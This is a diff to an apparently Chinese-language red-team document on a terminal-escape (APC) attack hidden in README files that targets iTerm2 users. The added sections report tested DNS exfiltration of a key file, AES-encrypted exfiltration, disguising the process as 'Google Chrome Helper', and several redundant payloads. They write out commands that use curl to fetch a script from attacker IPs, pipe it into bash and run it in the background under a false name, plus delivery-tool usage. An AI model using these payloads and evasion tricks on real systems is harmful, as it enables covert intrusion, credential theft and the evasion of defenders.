@@ -1546,38 +1546,104 @@ hex： 286e6f687570207368202d6320276375726c...2629
 APC： 235 字节（原 143 字节，+92 字节换取后台执行）
 </code></pre>
 <p><strong>终端执行后立即返回提示符，脚本在后台跑完。</strong></p>
-<p><strong>P2 — 可选</strong></p>
+<p><strong>P2 — 已完成</strong></p>
 <table>
 <thead>
 <tr>
 <th>项</th>
 <th>做法</th>
-<th>收益</th>
+<th>实测结果</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>DNS 外带兜底</td>
-<td>nc/curl 失败时用 DNS</td>
-<td>提升外带率</td>
+<td><strong>DNS 外带兜底</strong></td>
+<td>base64url 分片塞进子域名，52 字符/片</td>
+<td>✓ 53 字节文件分 2 片，重组后逐字节一致</td>
 </tr>
 <tr>
-<td>加密打包</td>
-<td><code>tar czf - \| openssl enc -aes-256-cbc</code></td>
-<td>抓包解不开</td>
+<td><strong>AES-256 加密</strong></td>
+<td><code>openssl enc -aes-256-cbc -pbkdf2 -iter 10000 -salt</code></td>
+<td>✓ 330B→352B，SHA256 无损，错误密钥 bad decrypt</td>
 </tr>
 <tr>
-<td>进程名伪装</td>
-<td><code>exec -a ChromeHelper bash</code></td>
-<td>ps 看不出</td>
+<td><strong>进程名伪装</strong></td>
+<td>复制 bash 到 <code>.chromehelper</code>（≤15 字符）+ <code>exec -a</code></td>
+<td>✓ <code>comm=.chromehelper</code>，<code>cmdline=Google Chrome Helper (Renderer)</code></td>
 </tr>
 <tr>
-<td>多 APC 冗余</td>
-<td>一个 README 嵌多个 APC</td>
-<td>提升鲁棒性</td>
+<td><strong>多 APC 冗余</strong></td>
+<td>一个 README 嵌 N 个 APC，各指向不同服务器</td>
+<td>✓ 3/3 全部执行</td>
 </tr>
 </tbody>
 </table>
+<h3 id="dns">DNS 外带实测</h3>
+<pre><code>捕获:
+  VGhpcyBpcyBhIGZha2UgU1NIIHByaXZhdGUga2V5IGZvciBETlMg.0-2.test.66d997e011fa.127.0.0.1
+  ZXhmaWwgdGVzdGluZwo.1-2.test.66d997e011fa.127.0.0.1
+
+分片数: 2  索引: [0, 1]
+重组: 71 字符 → 解码 53 字节
+内容: &quot;This is a fake SSH private key for DNS exfil testing&quot;
+✓✓ 与原始文件完全一致
+</code></pre>
+<p><strong>QNAME 结构</strong>：<code>&lt;base64url分片&gt;.&lt;索引&gt;-&lt;总数&gt;.&lt;标签&gt;.&lt;主机名&gt;.&lt;域名&gt;</code></p>
+<p><strong>为什么最抗封锁</strong>：DNS 必须能解析，否则目标连不上网。即使 HTTP/HTTPS 全被墙，DNS 通常仍然通。</p>
+<p><strong>限制</strong>：只用于小数据（&lt;500KB），大文件会触发 DNS 速率限制。</p>
+<h3 id="aes">AES 加密实测</h3>
+<pre><code>原始:      330 字节  sha256=513ddfb1...
+加密后:    352 字节  (+22 = Salted__头 8 + salt 8 + padding 6)
+头部 hex:  53616c7465645f5f...   ← &quot;Salted__&quot;
+明文可见:  ✗（已加密）
+错误密钥:  bad decrypt（预期）
+正确解密:  sha256=513ddfb1...   ✓ 完全一致
+
+性能:
+  1MB 加密: 25 ms
+  1MB 解密: 20 ms
+  100KB 预计: ~2 ms（可忽略）
+</code></pre>
+<p><strong>即使流量被抓包，没有 <code>EXFIL_KEY</code> 也解不开。</strong></p>
+<h3 id="_11">进程名伪装实测</h3>
+<pre><code>T+1s ~ T+6s 全程保持:
+  /proc/PID/comm:    .chromehelper
+  /proc/PID/cmdline: Google Chrome Helper (Renderer) /tmp/p.sh
+  /proc/PID/exe:     /tmp/.chromehelper
+
+ps aux | grep chrome:
+  root 2709 ... Google Chrome Helper (Renderer) /tmp/p.sh   ✓
+ps aux | grep bash:
+  （只有测试脚本自己，目标进程看不到）
+</code></pre>
+<p><strong>关键限制</strong>：Linux 内核的 <code>comm</code> 上限是 <code>TASK_COMM_LEN=16</code>（含 NUL），即 <strong>15 个字符</strong>。</p>
+<pre><code>复制 bash 到 .Google_Chrome_Helper  → comm=.Google_Chrome_  （截断）
+复制 bash 到 .chromehelper          → comm=.chromehelper    （13 字符，完整）
+</code></pre>
+<p><strong>所以用短名 <code>.chromehelper</code>（13 字符）+ <code>exec -a</code> 设置长 cmdline 是最优组合。</strong></p>
+<p><strong>另一个关键</strong>：<code>bash -c 'sleep 8'</code> 会被 bash 优化成直接 <code>execve("sleep")</code>，<code>comm</code> 变成 <code>sleep</code>。<strong>必须执行脚本文件</strong>（<code>bash script.sh</code>）才能保持 comm。</p>
+<h3 id="apc">多 APC 冗余实测</h3>
+<pre><code>目标数: 3
+  [1] 1.2.3.4:8080     APC 351 字节
+  [2] 5.6.7.8:8081     APC 351 字节
+  [3] 9.10.11.12:9090  APC 359 字节
+APC 总长: 1061 字节
+README: 2292 字节
+
+每个 APC 的真实命令:
+  [1] (nohup bash -c 'exec -a &quot;Google Chrome Helper&quot; bash -c &quot;curl -s 1.2.3.4:8080/s|bash&quot;' &gt;/dev/null 2&gt;&amp;1 &amp;)
+  [2] (nohup bash -c 'exec -a &quot;Google Chrome Helper&quot; bash -c &quot;curl -s 5.6.7.8:8081/s|bash&quot;' &gt;/dev/null 2&gt;&amp;1 &amp;)
+  [3] (nohup bash -c 'exec -a &quot;Google Chrome Helper&quot; bash -c &quot;curl -s 9.10.11.12:9090/s|bash&quot;' &gt;/dev/null 2&gt;&amp;1 &amp;)
+
+执行验证: 3/3 全部执行 ✓
+</code></pre>
+<p><strong>用法</strong>：</p>
+<pre><code class="language-bash">python delivery.py --multi &quot;1.2.3.4:8080,5.6.7.8:8081,9.10.11.12:9090&quot; --out ./delivery
+</code></pre>
+<p><strong>优势</strong>：<br />
+- 任何一个 VPS 可达就成功<br />
+- 多个 VPS 同时收数据 → 冗余备份<br />
+- 每个 APC 的 <code>clear</code> 会清掉前面的报错，屏幕始终干净</p>
 <h3 id="85">8.5 一个反直觉的发现</h3>
 <p><strong>Line 1 的报错无法消除。</strong></p>
 <p>file_path 不能以 <code>#</code> 开头，因为那会让 Line 1 变成：</p>
@@ -1587,7 +1653,7 @@ APC： 235 字节（原 143 字节，+92 字节换取后台执行）
 <p><strong>根本原因：iTerm2 的响应格式是固定的（<code>EBADF:&lt;error&gt;</code>），前缀不受攻击者控制。</strong></p>
 <p><strong>所以 Line 1 的报错只能靠 <code>clear</code> 覆盖，不能从源头消除。</strong></p>
 <hr />
-<h2 id="_11">九、检测与规避</h2>
+<h2 id="_12">九、检测与规避</h2>
 <h3 id="81">8.1 受害者侧的可见痕迹</h3>
 <table>
 <thead>
@@ -1635,7 +1701,7 @@ APC： 235 字节（原 143 字节，+92 字节换取后台执行）
 · 执行后 clear 屏幕
 </code></pre>
 <hr />
-<h2 id="_12">十、局限</h2>
+<h2 id="_13">十、局限</h2>
 <h3 id="91">9.1 技术局限</h3>
 <table>
 <thead>
@@ -1702,7 +1768,7 @@ APC： 235 字节（原 143 字节，+92 字节换取后台执行）
 · 有明确的测试范围和边界
 </code></pre>
 <hr />
-<h2 id="_13">十一、文件清单</h2>
+<h2 id="_14">十一、文件清单</h2>
 <pre><code>redteam/recon/
 ├── payload-full.sh           收集脚本（22 模块，535 行）
 ├── delivery.py               投递包生成器（3 形态 + CRLF 检测）
@@ -1718,7 +1784,7 @@ APC： 235 字节（原 143 字节，+92 字节换取后台执行）
 └── delivery/                 已生成的投递包
 </code></pre>
 <hr />
-<h2 id="_14">十二、快速开始</h2>
+<h2 id="_15">十二、快速开始</h2>
 <pre><code class="language-bash"># 1. 改 IP
 export ATTACKER_IP=1.2.3.4
 export ATTACKER_PORT=4444
